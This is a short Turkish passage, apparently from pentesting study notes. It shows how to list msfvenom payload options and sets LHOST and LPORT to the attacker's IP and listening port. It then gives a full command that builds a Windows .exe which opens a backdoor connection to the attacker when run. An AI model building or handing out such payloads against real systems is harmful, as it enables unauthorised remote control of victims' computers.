- ▶️ Seçilen payload’un opsiyonlarını görmek için:  
```bash
msfvenom --payload <secilen_payload> --list options
```

- ⚙️ Opsiyonların çoğu genellikle sabittir ✅  
  - 🏠 **LHOST** → saldırganın IP adresi  
  - 🔌 **LPORT** → saldırganın dinleyeceği port (genelde `8080`, başarısız olursa değiştirilebilir)  

- 📦 Payload’u **exe formatında** üretmek için:  
```bash
msfvenom --payload <secilen_payload> LHOST=<saldirgan_ip> LPORT=8080 --format exe --out <dosya_adi>.exe
```

- 💻 Elde edilen `.exe` dosyası **Windows’ta çalıştırılmalıdır**  
- 🚪 Çalıştırıldığında saldırgan makine ile bağlantı kurularak **arka kapı erişimi (backdoor)** açılır 

---



